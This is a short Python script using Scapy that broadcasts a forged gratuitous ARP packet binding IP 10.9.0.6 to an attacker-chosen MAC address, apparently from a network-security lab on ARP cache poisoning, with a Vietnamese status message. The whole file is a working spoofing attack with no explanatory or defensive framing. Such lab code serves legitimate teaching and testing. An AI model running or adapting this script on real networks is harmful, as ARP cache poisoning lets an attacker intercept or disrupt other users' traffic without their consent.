#!/usr/bin/python3
from scapy.all import *

E = Ether()
E.dst = 'ff:ff:ff:ff:ff:ff'  

A = ARP()
A.op = 1                     
A.psrc = '10.9.0.6'          
A.pdst = '10.9.0.6'         
A.hwsrc = '02:42:0a:09:00:69'

pkt = E/A
print("Dang gui Gratuitous ARP...")
sendp(pkt)
